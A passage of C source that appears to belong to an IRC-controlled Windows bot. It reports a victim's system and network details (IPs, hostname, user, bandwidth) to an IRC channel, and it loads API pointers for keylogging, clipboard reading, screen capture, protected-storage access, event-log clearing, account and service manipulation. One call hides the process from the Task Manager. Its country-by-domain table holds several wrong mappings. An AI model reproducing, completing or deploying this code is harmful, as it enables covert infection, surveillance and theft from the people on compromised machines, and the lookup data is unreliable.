		sysinfo_title, GetCPUSpeed(), mtotal, mavail, replacestr(os,"Service Pack ","SP"), 
		verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, sysdir, CurrentBox, CurrentUser, date, time, Uptime(GetTickCount(),0,TRUE), tmpFree, tmpTotal);

	irc->privmsg(target,sinfo);
	return;
}
#endif

#ifndef NO_NETINFO
DWORD band(BOOL bdownload)
{
	DWORD rval=0;
	
	//DWORD download2=0,band=0;
	char *buffer=NULL;
	
	DWORD count;//number of table entries

	ULONG buf_size=0;
	MIB_IFROW *ifr;
	MIB_IFTABLE *ift;
	DWORD ii=0;
	
	if (fGetIfTable((PMIB_IFTABLE)buffer, &buf_size, TRUE) != ERROR_INSUFFICIENT_BUFFER)
		return 0;

	buffer=(char *)malloc(buf_size);
	if (buffer==NULL)
		return 0;
	ZeroMemory(buffer,buf_size);
	
	if (fGetIfTable((PMIB_IFTABLE)buffer, &buf_size, TRUE) != NO_ERROR)
		return 0;

	ift=(MIB_IFTABLE *)buffer;
	count=ift->dwNumEntries;
	for (ii=0; ii<count; ii++)
	{
		ifr = (ift->table) + ii;
		if(ifr->dwInUcastPkts > 0 && ifr->dwOutUcastPkts > 0)
		{
			if(ifr->dwInUcastPkts == ifr->dwOutUcastPkts)
			{
				ii=ii;
			}
			else
			{
				if (bdownload)
					rval=(DWORD)ifr->dwInOctets;
				else
					rval=(DWORD)ifr->dwOutOctets;
				free(buffer);
				return rval;
			}
		}
	}
	free(buffer);
	return rval;
}



void netinfo(char *target, void* conn,BOOL mb, BOOL gb)
{
	IRC* irc=(IRC*)conn;
	DWORD n;
	char ctype[8], cname[128];
	static char country[128];
	char ninfo[IRCLINE];
	char tninfo[IRCLINE];

//	if (country[0] == '\0') sprintf(country, checkhost(host));	// country
	
	// get connection type/name
	ZeroMemory(cname,sizeof(cname));
	if (!nowininet) {
		if (!fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0))
			sprintf(cname, "Not connected");
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) 
			sprintf(ctype, "Dial-up");
	 	else 
			sprintf(ctype,  "LAN");
	} else {
		sprintf(ctype, "N/A");
		sprintf(cname, "N/A");
	}
	
	DWORD bandw=0,upbandw=0;
	char downloaded[50],uploaded[50];
	if (!noiphlpapi)
	{
		bandw=band(TRUE);
		upbandw=band(FALSE);
	}
	if (mb)
	{
		sprintf(downloaded,"%sMB",commaI64(bandw/1048576));
		sprintf(uploaded,"%sMB",commaI64(upbandw/1048576));
	}
	else if (gb)
	{
		sprintf(downloaded,"%sGB",commaI64(bandw/1073741824));
		sprintf(uploaded,"%sGB",commaI64(upbandw/1073741824));
	}
	else
	{
		sprintf(downloaded,"%sKB",commaI64(bandw/1024));
		sprintf(uploaded,"%sKB",commaI64(upbandw/1024));
	}

	_snprintf(ninfo, IRCLINE,
		"%s [Connection Type]: %s (%s). [Internal IP]: %s. [External IP]: %s. [Hostname]: %s. [Private]: %s.",
		netinfo_title, ctype, cname, inip, exip, host, (PrivateIP(inip)?("Yes"):("No")));

#ifndef NO_CHECKHOST
	sprintf(tninfo,"[Country]: %s.",checkhost(host));
	strncat(ninfo,tninfo,sizeof(ninfo));
#endif // NO_CHECKHOST


#ifndef NO_BWDISP
	sprintf(tninfo,"[Bandwidth]: Downloaded: %s, Uploaded: %s.",downloaded,uploaded);
	strncat(ninfo,tninfo,sizeof(ninfo));
#endif // NO_BWDISP
	
	irc->privmsg(target,ninfo);
	return;
}



#ifndef NO_CHECKHOST
char *checkhost(char *thost)
{
    char gethost[MAX_HOSTNAME];
	strcpy(gethost,thost);
    char *country;
	char *pHLD = strrchr(gethost, '.');

	if (pHLD) {
		if(strstr(pHLD, ".gov") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".net") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".org") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".com") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".mil") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".edu") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".uk") != NULL)
			country = "United Kingdom";    
		else if(strstr(pHLD, ".ac") != NULL)    
			country = "China";
		else if(strstr(pHLD, ".ar") != NULL)    
			country = "Uruguay";
		else if(strstr(pHLD, ".at") != NULL)
			country = "Austria";
		else if(strstr(pHLD, ".au") != NULL)
			country = "Australia";
		else if(strstr(pHLD, ".be") != NULL)
			country = "Belgium";
		else if(strstr(pHLD, ".bg") != NULL)
			country = "Bulgaria";
		else if(strstr(pHLD, ".br") != NULL)
			country = "Brazil";
		else if(strstr(pHLD, ".by") != NULL)
			country = "Belarus";
		else if(strstr(pHLD, ".ca") != NULL)
			country = "Canada";
		else if(strstr(pHLD, ".cc") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".ch") != NULL)
			country = "Switzerland";
		else if(strstr(pHLD, ".cl") != NULL)
			country = "Chile";
		else if(strstr(pHLD, ".cn") != NULL)
			country = "China";
		else if(strstr(pHLD, ".cr") != NULL)
			country = "Uruguay";
		else if(strstr(pHLD, ".cx") != NULL)
			country = "Poland";
		else if(strstr(pHLD, ".cz") != NULL)
			country = "Czech Republic";
		else if(strstr(pHLD, ".de") != NULL)
			country = "Germany";
		else if(strstr(pHLD, ".dk") != NULL)
			country = "Denmark";
		else if(strstr(pHLD, ".ee") != NULL)
			country = "Estonia";
		else if(strstr(pHLD, ".es") != NULL)
			country = "Spain";
		else if(strstr(pHLD, ".fi") != NULL)
			country = "Finland";
		else if(strstr(pHLD, ".fj") != NULL)
			country = "Figi";
		else if(strstr(pHLD, ".fr") != NULL)
			country = "France";
		else if(strstr(pHLD, ".ge") != NULL)
			country = "Georgia";
		else if(strstr(pHLD, ".gr") != NULL)
			country = "Greece";
		else if(strstr(pHLD, ".hk") != NULL)
			country = "Hong Kong";
		else if(strstr(pHLD, ".hu") != NULL)
			country = "Hungary";
		else if(strstr(pHLD, ".id") != NULL)
			country = "Indonesia";
		else if(strstr(pHLD, ".ie") != NULL)
			country = "Ireland";
		else if(strstr(pHLD, ".in") != NULL)
			country = "India";
		else if(strstr(pHLD, ".is") != NULL)
			country = "Iceland";
		else if(strstr(pHLD, ".it") != NULL)
			country = "Italy";
		else if(strstr(pHLD, ".jp") != NULL)
			country = "Japan";
		else if(strstr(pHLD, ".kg") != NULL)
			country = "Kyrgyzstan";
		else if(strstr(pHLD, ".kr") != NULL)
			country = "Korea";
		else if(strstr(pHLD, ".kz") != NULL)
			country = "Kazakhstan";
		else if(strstr(pHLD, ".lt") != NULL)
			country = "Lithuania";
		else if(strstr(pHLD, ".lv") != NULL)
			country = "Latvia";
		else if(strstr(pHLD, ".nl") != NULL)
			country = "Netherlands";
		else if(strstr(pHLD, ".no") != NULL)
			country = "Norway";
		else if(strstr(pHLD, ".nu") != NULL)
			country = "Japan";
		else if(strstr(pHLD, ".nz") != NULL)
			country = "New Zealand";
		else if(strstr(pHLD, ".pl") != NULL)
			country = "Poland";
		else if(strstr(pHLD, ".pt") != NULL)
			country = "Portugal";
		else if(strstr(pHLD, ".ro") != NULL)
			country = "Romania";
		else if(strstr(pHLD, ".ru") != NULL)
			country = "Russia";
		else if(strstr(pHLD, ".sa") != NULL)
			country = "Saudi Arabia";
		else if(strstr(pHLD, ".se") != NULL)
			country = "Sweden";
		else if(strstr(pHLD, ".sg") != NULL)
			country = "Singapore";
		else if(strstr(pHLD, ".si") != NULL)
			country = "Slovenia";
		else if(strstr(pHLD, ".sk") != NULL)
			country = "Slovakia";
		else if(strstr(pHLD, ".su") != NULL)
			country = "Russia";
		else if(strstr(pHLD, ".th") != NULL)
			country = "Thailand";
		else if(strstr(pHLD, ".tr") != NULL)
			country = "Turkey";
		else if(strstr(pHLD, ".tw") != NULL)
			country = "Taiwan";
		else if(strstr(pHLD, ".ua") != NULL)
			country = "Ukraine";
		else if(strstr(pHLD, ".us") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".za") != NULL)
			country = "South Africa";
		else
			country = "Unknown";
	} else
		country = "Unknown";

    return country;
}
#endif // NO_CHECKHOST
#endif // NO_NETINFO


// kernel32.dll function variables
SEM fSetErrorMode;
CT32S fCreateToolhelp32Snapshot;
P32F fProcess32First;
P32N fProcess32Next;
M32F fModule32First;
GDFSE fGetDiskFreeSpaceEx;
GLDS fGetLogicalDriveStrings;
GDT fGetDriveType;
SP fSearchPath;
QPC fQueryPerformanceCounter;
QPF fQueryPerformanceFrequency;
RSP fRegisterServiceProcess;
GCNA fGetComputerName;


// user32.dll function variables
CW fCloseWindow;
SM fSendMessage;
FW fFindWindow;
IW fIsWindow;
DW fDestroyWindow;
OC fOpenClipboard;
GCD fGetClipboardData;
CC fCloseClipboard;
EWE fExitWindowsEx;
#ifndef NO_KEYLOG
GAKS fGetAsyncKeyState;
GKS fGetKeyState;
GWT fGetWindowText;
GFW fGetForegroundWindow;
#endif // NO_KEYLOG
#ifndef NO_WINDOWCTRL
EW fEnumWindows;
GWI fGetWindowInfo;
GWTPI fGetWindowThreadProcessId;
SW fShowWindow;
IWV fIsWindowVisible;
GCN fGetClassName;
#endif // NO_WINDOWCTRL

// advapi32.dll function variables
ROKE fRegOpenKeyEx;
RCKE fRegCreateKeyEx;
RSVE fRegSetValueEx;
RQVE fRegQueryValueEx;
RDV fRegDeleteValue;
RDK fRegDeleteKey;
RCK fRegCloseKey;
REKE fRegEnumKeyEx;
REV fRegEnumValue;
RQIK fRegQueryInfoKey;
#ifndef NO_PROCESS
OTT fOpenThreadToken;
OPT fOpenProcessToken;
LPV fLookupPrivilegeValue;
ATP fAdjustTokenPrivileges;
#endif // NO_PROCESS
#ifndef NO_LSARESTRICT
LOP fLsaOpenPolicy;
LEAWUR fLsaEnumerateAccountsWithUserRight;
LLN2 fLsaLookupNames2;
LAAR fLsaAddAccountRights;
LRAR fLsaRemoveAccountRights;
LFM fLsaFreeMemory;
LC fLsaClose;
LNSTWE fLsaNtStatusToWinError;
#endif // NO_LSARESTRICT
#ifndef NO_CEL
CEL fClearEventLog;
CLEL fCloseEventLog;
OEL fOpenEventLog;
#endif // NO_CEL
OSCM fOpenSCManager;
SS fStartService;
CRS fCreateService;
OS fOpenService;
CSH fCloseServiceHandle;
SSCD fStartServiceCtrlDispatcher;
ESS fEnumServicesStatus;
CS fControlService;
DS fDeleteService;
IVSD fIsValidSecurityDescriptor;
ILOU fImpersonateLoggedOnUser;
LSD fLockServiceDatabase;
QSLS fQueryServiceLockStatus;
CSC2 fChangeServiceConfig2;
USD fUnlockServiceDatabase;
RSCH fRegisterServiceCtrlHandler;
SSS fSetServiceStatus;
#ifndef NO_SYSINFO
GUN fGetUserName;
#endif // NO_SYSINFO

// gdi32.dll function variables
CDC fCreateDC;
CDIBS fCreateDIBSection;
CCDC fCreateCompatibleDC;
GDC fGetDeviceCaps;
GDIBCT fGetDIBColorTable;
SO fSelectObject;
BB fBitBlt;
DDC fDeleteDC;
DO fDeleteObject;

// ws2_32.dll function variables
WSAS fWSAStartup;
WSASo fWSASocket;
WSAAS fWSAAsyncSelect;
WSAFDIS __fWSAFDIsSet;
WSAI fWSAIoctl;
WSAGLE fWSAGetLastError;
WSAC fWSACleanup;
SOCK fsocket;
IOCTLS fioctlsocket;
CON fconnect;
INTOA finet_ntoa;
IADDR finet_addr;
HTONS fhtons;
HTONL fhtonl;
NTOHS fntohs;
NTOHL fntohl;
SEND fsend;
SENDTO fsendto;
RECV frecv;
RECVFROM frecvfrom;
BIND fbind;
SEL fselect;
LIS flisten;
ACC faccept;
SSO fsetsockopt;
GSN fgetsockname;
GHN fgethostname;
GHBN fgethostbyname;
GHBA fgethostbyaddr;
GPN fgetpeername;
CLSO fclosesocket;
SD fshutdown;
#ifndef NO_NETSTATP
GSBP fgetservbyport;
#endif // NO_NETSTATP

// wininet.dll function variables
IGCS fInternetGetConnectedState;
IGCSE fInternetGetConnectedStateEx;
HOR fHttpOpenRequest;
HSR fHttpSendRequest;
FGF fFtpGetFile;
FPF fFtpPutFile;
IC fInternetConnect;
IO fInternetOpen;
IOU fInternetOpenUrl;
ICU fInternetCrackUrl;
IRF fInternetReadFile;
ICH fInternetCloseHandle;

HANDLE ih;

// icmp.dll function variables
#ifndef NO_PING
ICF fIcmpCreateFile;
ISE fIcmpSendEcho;
ICH fIcmpCloseHandle;
#endif // NO_PING

// netapi32.dll function variables
NSA fNetShareAdd;
NSD fNetShareDel;
NSE fNetShareEnum;
NSJA fNetScheduleJobAdd;
NABF fNetApiBufferFree;
NRTOD fNetRemoteTOD;
NUA fNetUserAdd;
NUD fNetUserDel;
NUE fNetUserEnum;
NUGI fNetUserGetInfo;
NMBS fNetMessageBufferSend;

// dnsapi.dll function variables
DFRC fDnsFlushResolverCache;
DFRCEA fDnsFlushResolverCacheEntry_A;


// iphlpapi.dll function variables
GIT fGetIfTable;
GINT fGetIpNetTable;
DINE fDeleteIpNetEntry;
GTT fGetTcpTable;
GUT fGetUdpTable;
#ifndef NO_NETSTATP
AAGTETFS fAllocateAndGetTcpExTableFromStack;
AAGUETFS fAllocateAndGetUdpExTableFromStack;
#endif // NO_NETSTATP
#ifndef NO_ENETINFO
GNP fGetNetworkParams;
#endif // NO_ENETINFO

// mpr.dll function variables
WNAC2 fWNetAddConnection2;
WNAC2W fWNetAddConnection2W;
WNCC2 fWNetCancelConnection2;
WNCC2W fWNetCancelConnection2W;

// shell32.dll function variables
SE fShellExecute;
SHCN fSHChangeNotify;

// odbc32.dll function variables
SQLDC fSQLDriverConnect;
SQLSEA fSQLSetEnvAttr;
SQLED fSQLExecDirect;
SQLAH fSQLAllocHandle;
SQLFH fSQLFreeHandle;
SQLD fSQLDisconnect;

#ifndef NO_CAPTURE
// avicap32.dll function variables
cCCW fcapCreateCaptureWindow;
cGDD fcapGetDriverDescription;
#endif // NO_CAPTURE

// psapi.dll function variables
GMFNE fGetModuleFileNameEx;
GMBN fGetModuleBaseName;
EPM fEnumProcessModules;
EP fEnumProcesses;
GPMI fGetProcessMemoryInfo;

#ifndef NO_PSTORE
//pstorec.dll function variables
PSCI fPStoreCreateInstance;
#endif

//shlwapi.dll function variables
PRFS fPathRemoveFileSpec;


// globals for dynamic libraries
BOOL nokernel32 = FALSE;
DWORD nokernel32err = 0;
BOOL nouser32 = FALSE;
DWORD nouser32err = 0;
BOOL noadvapi32 = FALSE;
BOOL noadvapi32lsa = FALSE;
DWORD noadvapi32err = 0;
BOOL nogdi32 = FALSE;
DWORD nogdi32err = 0;
BOOL nows2_32 = FALSE;
DWORD nows2_32err = 0;
BOOL nowininet = FALSE;
DWORD nowinineterr = 0;
BOOL noicmp = FALSE;
DWORD noicmperr = 0;
BOOL nonetapi32 = FALSE;
DWORD nonetapi32err = 0;
BOOL nodnsapi = FALSE;
DWORD nodnsapierr = 0;
BOOL noiphlpapi = FALSE;
BOOL noiphlpapinsp = FALSE;
DWORD noiphlpapierr = 0;
BOOL nompr = FALSE;
DWORD nomprerr = 0;
BOOL noshell32 = FALSE;
DWORD noshell32err = 0;
BOOL noodbc32 = FALSE;
DWORD noodbc32err = 0;
BOOL noavicap32 = FALSE;
DWORD noavicap32err = 0;
BOOL nopsapi = FALSE;
DWORD nopsapierr = 0;
BOOL nopstore = FALSE;
DWORD nopstoreerr = 0;
BOOL noshlwapi = FALSE;
DWORD noshlwapierr = 0;

BOOL LoadDLLs(void) 
{
	// dynamically load kernel32.dll
	HMODULE kernel32_dll = GetModuleHandle("kernel32.dll");
	if (kernel32_dll) {
		fSetErrorMode = (SEM)GetProcAddress(kernel32_dll, "SetErrorMode");
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");
		fModule32First = (M32F)GetProcAddress(kernel32_dll, "Module32First");
		fGetDiskFreeSpaceEx = (GDFSE)GetProcAddress(kernel32_dll, "GetDiskFreeSpaceExA");
		fGetLogicalDriveStrings = (GLDS)GetProcAddress(kernel32_dll, "GetLogicalDriveStringsA");
		fGetDriveType = (GDT)GetProcAddress(kernel32_dll, "GetDriveTypeA");
		fSearchPath = (SP)GetProcAddress(kernel32_dll, "SearchPathA");
		fQueryPerformanceCounter = (QPC)GetProcAddress(kernel32_dll, "QueryPerformanceCounter");
		fQueryPerformanceFrequency = (QPF)GetProcAddress(kernel32_dll, "QueryPerformanceFrequency");
		fGetComputerName = (GCNA)GetProcAddress(kernel32_dll, "GetComputerNameA");

		if (!fSetErrorMode || !fCreateToolhelp32Snapshot || !fProcess32First || !fProcess32Next 
			|| !fGetDiskFreeSpaceEx || !fGetLogicalDriveStrings || !fGetDriveType || !fSearchPath 
			|| !fQueryPerformanceCounter || !fQueryPerformanceFrequency || !fGetComputerName)
			nokernel32 = TRUE;

		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		// hide from the Windows 9x Task Manager
		if (fRegisterServiceProcess) 
			fRegisterServiceProcess(0, 1);
	} else {
		nokernel32err = GetLastError();
		nokernel32 = TRUE;
	}

	// dynamically load user32.dll
 	HMODULE user32_dll = LoadLibrary("user32.dll");
    if (user32_dll) {
		fCloseWindow = (CW)GetProcAddress(user32_dll,"CloseWindow");
		fSendMessage = (SM)GetProcAddress(user32_dll,"SendMessageA");
		fFindWindow = (FW)GetProcAddress(user32_dll,"FindWindowA");
		fIsWindow = (IW)GetProcAddress(user32_dll,"IsWindow");
		fDestroyWindow = (DW)GetProcAddress(user32_dll,"DestroyWindow");
		fOpenClipboard = (OC)GetProcAddress(user32_dll,"OpenClipboard");
		fGetClipboardData = (GCD)GetProcAddress(user32_dll,"GetClipboardData");
		fCloseClipboard = (CC)GetProcAddress(user32_dll,"CloseClipboard");
		fExitWindowsEx = (EWE)GetProcAddress(user32_dll,"ExitWindowsEx");

		if (!fCloseWindow || !fSendMessage || !fFindWindow || !fIsWindow || !fDestroyWindow 
			|| !fOpenClipboard || !fGetClipboardData || !fCloseClipboard
			|| !fExitWindowsEx)
	        nouser32 = TRUE;

#ifndef NO_KEYLOG
		fGetAsyncKeyState = (GAKS)GetProcAddress(user32_dll,"GetAsyncKeyState");
		fGetKeyState = (GKS)GetProcAddress(user32_dll,"GetKeyState");
		fGetWindowText = (GWT)GetProcAddress(user32_dll,"GetWindowTextA");
		fGetForegroundWindow = (GFW)GetProcAddress(user32_dll,"GetForegroundWindow");

		if (!fGetAsyncKeyState || !fGetKeyState || !fGetWindowText || !fGetForegroundWindow) 
			nouser32 = TRUE;
#endif // NO_KEYLOG


#ifndef NO_WINDOWCTRL
		fEnumWindows = (EW)GetProcAddress(user32_dll,"EnumWindows");
		fGetWindowInfo = (GWI)GetProcAddress(user32_dll,"GetWindowInfo");
		fGetWindowThreadProcessId = (GWTPI)GetProcAddress(user32_dll,"GetWindowThreadProcessId");
		fShowWindow = (SW)GetProcAddress(user32_dll,"ShowWindow");
		fIsWindowVisible = (IWV)GetProcAddress(user32_dll,"IsWindowVisible");
		fGetClassName = (GCN)GetProcAddress(user32_dll,"GetClassNameA");
		
		if (!fEnumWindows || !fGetWindowInfo || !fGetWindowThreadProcessId || !fShowWindow
			|| !fIsWindowVisible || !fGetClassName)
			nouser32 = TRUE;

#endif // NO_WINDOWCTRL

	} else {
		nouser32err = GetLastError();
		nouser32 = TRUE;
	}

	// dynamically load advapi32.dll
 	HMODULE advapi32_dll = LoadLibrary("advapi32.dll");
    if (advapi32_dll) {
		fRegOpenKeyEx = (ROKE)GetProcAddress(advapi32_dll,"RegOpenKeyExA");
		fRegCreateKeyEx = (RCKE)GetProcAddress(advapi32_dll,"RegCreateKeyExA");
		fRegSetValueEx = (RSVE)GetProcAddress(advapi32_dll,"RegSetValueExA");
		fRegQueryValueEx = (RQVE)GetProcAddress(advapi32_dll,"RegQueryValueExA");
		fRegDeleteValue = (RDV)GetProcAddress(advapi32_dll,"RegDeleteValueA");
		fRegDeleteKey = (RDK)GetProcAddress(advapi32_dll,"RegDeleteKeyA");
		fRegCloseKey = (RCK)GetProcAddress(advapi32_dll,"RegCloseKey");
		fRegEnumKeyEx = (REKE)GetProcAddress(advapi32_dll,"RegEnumKeyExA");
		fRegEnumValue = (REV)GetProcAddress(advapi32_dll,"RegEnumValueA");
		fRegQueryInfoKey = (RQIK)GetProcAddress(advapi32_dll,"RegQueryInfoKeyA");

		if (!fRegOpenKeyEx || !fRegCreateKeyEx || !fRegSetValueEx 
			|| !fRegQueryValueEx || !fRegDeleteValue || !fRegDeleteKey || !fRegCloseKey
			|| !fRegEnumValue || !fRegQueryInfoKey)
	        noadvapi32 = TRUE;

#ifndef NO_PROCESS
		fOpenThreadToken = (OTT)GetProcAddress(advapi32_dll,"OpenThreadToken");
		fOpenProcessToken = (OPT)GetProcAddress(advapi32_dll,"OpenProcessToken");
		fLookupPrivilegeValue = (LPV)GetProcAddress(advapi32_dll,"LookupPrivilegeValueA");
		fAdjustTokenPrivileges = (ATP)GetProcAddress(advapi32_dll,"AdjustTokenPrivileges");

		if (!fOpenThreadToken || !fOpenProcessToken || !fLookupPrivilegeValue || !fAdjustTokenPrivileges) 
	        noadvapi32 = TRUE;		
#endif // NO_PROCESS

#ifndef NO_LSARESTRICT
		fLsaOpenPolicy = (LOP)GetProcAddress(advapi32_dll,"LsaOpenPolicy");
		fLsaEnumerateAccountsWithUserRight = (LEAWUR)GetProcAddress(advapi32_dll,"LsaEnumerateAccountsWithUserRight");
		fLsaLookupNames2 = (LLN2)GetProcAddress(advapi32_dll, "LsaLookupNames2");
		fLsaAddAccountRights = (LAAR)GetProcAddress(advapi32_dll,"LsaAddAccountRights");
		fLsaRemoveAccountRights = (LRAR)GetProcAddress(advapi32_dll,"LsaRemoveAccountRights");
		fLsaFreeMemory = (LFM)GetProcAddress(advapi32_dll,"LsaFreeMemory");
		fLsaClose = (LC)GetProcAddress(advapi32_dll,"LsaClose");
		fLsaNtStatusToWinError = (LNSTWE)GetProcAddress(advapi32_dll,"LsaNtStatusToWinError");

		if (!fLsaOpenPolicy || !fLsaEnumerateAccountsWithUserRight || !fLsaLookupNames2 || !fLsaAddAccountRights 
			|| !fLsaRemoveAccountRights || !fLsaFreeMemory || !fLsaClose || !fLsaNtStatusToWinError)
			noadvapi32lsa = TRUE;
#endif // NO_LSARESTRICT

	 	fOpenSCManager = (OSCM)GetProcAddress(advapi32_dll,"OpenSCManagerA");
	 	fOpenService = (OS)GetProcAddress(advapi32_dll,"OpenServiceA");
		fStartService = (SS)GetProcAddress(advapi32_dll,"StartServiceA");
	 	fControlService = (CS)GetProcAddress(advapi32_dll,"ControlService");
	 	fDeleteService = (DS)GetProcAddress(advapi32_dll,"DeleteService");
	 	fCloseServiceHandle = (CSH)GetProcAddress(advapi32_dll,"CloseServiceHandle");
	 	fEnumServicesStatus = (ESS)GetProcAddress(advapi32_dll,"EnumServicesStatusA");
		fIsValidSecurityDescriptor = (IVSD)GetProcAddress(advapi32_dll,"IsValidSecurityDescriptor");
		fCreateService = (CRS)GetProcAddress(advapi32_dll,"CreateServiceA");
	 	fStartServiceCtrlDispatcher = (SSCD)GetProcAddress(advapi32_dll,"StartServiceCtrlDispatcherA");
	 	fImpersonateLoggedOnUser = (ILOU)GetProcAddress(advapi32_dll,"ImpersonateLoggedOnUser");
	 	fLockServiceDatabase = (LSD)GetProcAddress(advapi32_dll,"LockServiceDatabase");
		fQueryServiceLockStatus = (QSLS)GetProcAddress(advapi32_dll,"QueryServiceLockStatusA");
		fChangeServiceConfig2 = (CSC2)GetProcAddress(advapi32_dll,"ChangeServiceConfig2A");
		fUnlockServiceDatabase = (USD)GetProcAddress(advapi32_dll,"UnlockServiceDatabase");
		fRegisterServiceCtrlHandler = (RSCH)GetProcAddress(advapi32_dll,"RegisterServiceCtrlHandlerA");
		fSetServiceStatus = (SSS)GetProcAddress(advapi32_dll,"SetServiceStatus");

		if (!fOpenSCManager || !fOpenService || !fStartService || !fControlService 
			|| !fDeleteService || !fCloseServiceHandle || !fEnumServicesStatus
			|| !fIsValidSecurityDescriptor || !fImpersonateLoggedOnUser || !fLockServiceDatabase
			|| !fQueryServiceLockStatus || !fChangeServiceConfig2 || !fUnlockServiceDatabase
			|| !fRegisterServiceCtrlHandler || !fSetServiceStatus)
	        noadvapi32 = TRUE;

#ifndef NO_SYSINFO
		fGetUserName = (GUN)GetProcAddress(advapi32_dll,"GetUserNameA");

		if (!fGetUserName)
			noadvapi32 = TRUE;
#endif // NO_SYSINFO

#ifndef NO_CEL
		fClearEventLog = (CEL)GetProcAddress(advapi32_dll,"ClearEventLogA");
		fOpenEventLog = (OEL)GetProcAddress(advapi32_dll,"OpenEventLogA");
		fCloseEventLog = (CLEL)GetProcAddress(advapi32_dll,"CloseEventLog");

		if (!fClearEventLog || !fOpenEventLog || !fCloseEventLog)
			noadvapi32 = TRUE;
#endif

	} else {
		noadvapi32err = GetLastError();
		noadvapi32 = TRUE;
	}

	// dynamically load gdi32.dll
 	HMODULE gdi32_dll = GetModuleHandle("gdi32.dll");
    if (gdi32_dll) {
		fCreateDC = (CDC)GetProcAddress(gdi32_dll,"CreateDCA");
		fCreateDIBSection = (CDIBS)GetProcAddress(gdi32_dll,"CreateDIBSection");
		fCreateCompatibleDC = (CCDC)GetProcAddress(gdi32_dll,"CreateCompatibleDC");
		fGetDeviceCaps = (GDC)GetProcAddress(gdi32_dll,"GetDeviceCaps");
		fGetDIBColorTable = (GDIBCT)GetProcAddress(gdi32_dll,"GetDIBColorTable");
		fSelectObject = (SO)GetProcAddress(gdi32_dll,"SelectObject");
		fBitBlt = (BB)GetProcAddress(gdi32_dll,"BitBlt");
		fDeleteDC = (DDC)GetProcAddress(gdi32_dll,"DeleteDC");
		fDeleteObject = (DO)GetProcAddress(gdi32_dll,"DeleteObject");

		if (!fCreateDC || !fCreateDIBSection || !fCreateCompatibleDC || !fGetDeviceCaps 
			|| !fGetDIBColorTable || !fSelectObject || !fBitBlt || !fDeleteDC || !fDeleteObject)
	        nogdi32 = TRUE;
	} else {
		nogdi32err = GetLastError();
		nogdi32 = TRUE;
	}

    // dynamically load ws2_32.dll
 	HMODULE ws2_32_dll = LoadLibrary("ws2_32.dll");
    if (ws2_32_dll) {
	 	fWSAStartup = (WSAS)GetProcAddress(ws2_32_dll,"WSAStartup");
		fWSASocket = (WSASo)GetProcAddress(ws2_32_dll,"WSASocketA");
		fWSAAsyncSelect = (WSAAS)GetProcAddress(ws2_32_dll,"WSAAsyncSelect");
		__fWSAFDIsSet = (WSAFDIS)GetProcAddress(ws2_32_dll,"__WSAFDIsSet");
		fWSAIoctl = (WSAI)GetProcAddress(ws2_32_dll,"WSAIoctl");
		fWSAGetLastError = (WSAGLE)GetProcAddress(ws2_32_dll,"WSAGetLastError");
		fWSACleanup = (WSAC)GetProcAddress(ws2_32_dll,"WSACleanup");
  		fsocket = (SOCK)GetProcAddress(ws2_32_dll,"socket");
		fioctlsocket = (IOCTLS)GetProcAddress(ws2_32_dll,"ioctlsocket");
		fconnect = (CON)GetProcAddress(ws2_32_dll,"connect");
		finet_ntoa = (INTOA)GetProcAddress(ws2_32_dll,"inet_ntoa");
		finet_addr = (IADDR)GetProcAddress(ws2_32_dll,"inet_addr");
		fhtons = (HTONS)GetProcAddress(ws2_32_dll,"htons");
		fhtonl = (HTONL)GetProcAddress(ws2_32_dll,"htonl");
		fntohs = (NTOHS)GetProcAddress(ws2_32_dll,"ntohs");
		fntohl = (NTOHL)GetProcAddress(ws2_32_dll,"ntohl");
		fsend = (SEND)GetProcAddress(ws2_32_dll,"send");
		fsendto = (SENDTO)GetProcAddress(ws2_32_dll,"sendto");
		frecv = (RECV)GetProcAddress(ws2_32_dll,"recv");
		frecvfrom = (RECVFROM)GetProcAddress(ws2_32_dll,"recvfrom");
		fbind = (BIND)GetProcAddress(ws2_32_dll,"bind");
		fselect = (SEL)GetProcAddress(ws2_32_dll,"select");
		flisten = (LIS)GetProcAddress(ws2_32_dll,"listen");
		faccept = (ACC)GetProcAddress(ws2_32_dll,"accept");
		fsetsockopt = (SSO)GetProcAddress(ws2_32_dll,"setsockopt");
		fgetsockname = (GSN)GetProcAddress(ws2_32_dll,"getsockname");
		fgethostname = (GHN)GetProcAddress(ws2_32_dll,"gethostname");
		fgethostbyname = (GHBN)GetProcAddress(ws2_32_dll,"gethostbyname");
		fgethostbyaddr = (GHBA)GetProcAddress(ws2_32_dll,"gethostbyaddr");
		fgetpeername = (GPN)GetProcAddress(ws2_32_dll,"getpeername");
		fclosesocket = (CLSO)GetProcAddress(ws2_32_dll,"closesocket");
		fshutdown = (SD)GetProcAddress(ws2_32_dll,"shutdown");

		if (!fWSAStartup || !fWSASocket || !fWSAAsyncSelect || !fWSAIoctl || !fWSAGetLastError 
			|| !fWSACleanup || !fsocket || !fioctlsocket || !fconnect || !finet_ntoa || !finet_addr
			|| !fhtons || !fhtonl || !fntohs || !fsend || !fsendto || !frecv || !frecvfrom || !fbind
			|| !fselect || !flisten || !faccept || !fsetsockopt || !fgetsockname || !fgethostname
			|| !fgethostbyname || !fgethostbyaddr || !fclosesocket)	
	        nows2_32 = TRUE;

#ifndef NO_NETSTATP
		fgetservbyport = (GSBP)GetProcAddress(ws2_32_dll,"getservbyport");

		if (!fgetservbyport)
			nows2_32 = TRUE;
#endif // NO_NETSTATP

	} else {
		nows2_32err = GetLastError();
		nows2_32 = TRUE;
	}

	// dynamically load wininet.dll
	HMODULE wininet_dll = LoadLibrary("wininet.dll");
    if (wininet_dll) {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
